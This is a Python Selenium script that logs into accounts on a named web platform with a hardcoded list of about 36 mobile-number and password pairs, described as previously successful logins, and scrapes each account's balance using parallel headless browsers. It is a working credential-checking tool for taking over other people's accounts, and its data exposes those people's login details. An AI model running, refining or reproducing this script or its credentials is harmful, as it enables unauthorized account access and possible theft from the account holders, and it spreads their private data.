# check faster when u know all the attributes(login details from html)
# Use this when u have to check balance of previously successful logins by pasting input data as shown below
# CHECK ONLY BALANCE WHEN U HAVE INPUT DATA IN BELOW FORMAT
# u can directly paste the table data without converting it
# USE THIS FOR BEST PERFORMANCE
# format: mobile      password
# format: 7353346164      7353346164s
# check HELPME.txt for reference

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, TimeoutException, NoSuchWindowException
import threading

login_url = "https://www.catpwt7-ptoac81.in/index/user/login.html"
profile_url = "https://www.catpwt7-ptoac81.in/index/my/index.html"  # Profile URL
app_login_mobile= "tel"
app_login_password= "pwd"
app_login_button= "login"
balance_attribute = "//div[contains(text(), 'Balance')]" 
'''
<div>
<div style="">Balance<br>0.00</div>
<div style=""> Recharge<br>50.00</div>
<div style=""> Income<br>0</div>
</div>
'''

#mobile password
input_data = """\
7393020790	Rishu27
9009279079	vijay9806
9696691259	sumit27
7376205590	sumit27
7020392645	swati1900
6394139065	Hah738
7562879235	i88888
9103168850	Pktugd94857
8436618935	barun7679
8059986701	bsdk22
8882779031	komal123
9234508873	asas12
7665468526	Bk123456
6206415092	aa212121
8949987671	Hima1234
7353346164 7353346164s
9118866480	poo9999
9608787878	112211
8439367250	farhan765
9708569531	sonu3295
9460337873	aaa123
9756468254	975646aa
7042109474	ankit432
8745938006	ritika123
9612308458	Bd6565
8126758575	123456ak
6205043828	Babu2626
7376205597	sumit27
9044357817	ashu123
9794658151	gupta1234
9798205853	aaa111
9034893620	Sohan@123
7398003572	aman1234
8979931047	Moienkhan8979
8867305644	8867305644
8114832027	bnmhjk
"""
lines = input_data.split('\n')
successful_logins = []
for line in lines:
    parts = line.split()
    if len(parts) == 2: #make it 3 if u have only mobile and password balance
        mobile, password = parts #then add ,balance here
        successful_logins.append((mobile, password))
print("successful_logins =", successful_logins)

balance_list = []
success_list = []

def get_profile(browser_name, successful_login):
    # Define the options for headless mode
    if browser_name == "Chrome":
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        driver = webdriver.Chrome(options=options)
    else:
        options = webdriver.EdgeOptions()
        options.add_argument('--headless')
        driver = webdriver.Edge(options=options)

    for mobile, password in successful_login:
        try:
            driver.get(login_url)
            startpage = driver.current_url
            username_field = driver.find_element(By.NAME,app_login_mobile)
            password_field = driver.find_element(By.NAME, app_login_password)
            username_field.send_keys(mobile)
            password_field.send_keys(password)
            login_button = driver.find_element(By.CLASS_NAME, app_login_button)
            login_button.click()

            for _ in range(10):  # loop till we login
                if driver.current_url != startpage:
                    break
                time.sleep(0.5)
            if driver.current_url == startpage:
                print(f"Failed {mobile}")
            else:
                driver.get(profile_url)  # loop till we reach profile page
                for _ in range(10):
                    if driver.current_url == profile_url:
                        print(f"{mobile} is in: {profile_url}")
                        success_list.append((mobile,password))
                        break
                    time.sleep(0.5)

                    balance_element = driver.find_element(By.XPATH, balance_attribute)
                    balance_text = balance_element.text
                    balance = balance_text.split()[-1]
                    balance_list.append((mobile,password,balance))

        except NoSuchElementException:
            print(f"Element not found on the profile page for {mobile}. Check your element locators/name in the HTML code.")
        except TimeoutException:
            print(f"Timed out while waiting for the profile page to load for {mobile}.")
        except NoSuchWindowException:
            print(f"The browser window was closed unexpectedly for {mobile}.")
        except Exception as e:
            print(f"An unexpected error occurred for {mobile}: {str(e)}")
    driver.quit()

def split_credentials(credentials):
    mid = len(credentials) // 2
    return credentials[:mid], credentials[mid:]


if __name__ == '__main__':

    # process: get the withdraw/balance amount 
    chrome_credentials, edge_credentials = split_credentials(successful_logins)
    # Create two threads for Chrome and Edge browsers for get_profile
    chrome_thread = threading.Thread(target=get_profile, args=("Chrome", chrome_credentials))
    edge_thread = threading.Thread(target=get_profile, args=("Edge", edge_credentials))
    # Start both threads
    chrome_thread.start()
    edge_thread.start()
    # Wait for both threads to finish
    chrome_thread.join()
    edge_thread.join()
    # Print all successful logins in a single table format
    if success_list:
        print("\Success List:")
        print("Mobile\t\tPassword")
        for mobile, password in success_list:
            print(f"{mobile}\t{password}")
    if balance_list:
        print("\nAll Balances:")
        print("Mobile\t\tPassword\t\tBalance")
        for mobile, password, balance in balance_list:
            print(f"{mobile}\t{password}\t{balance}")
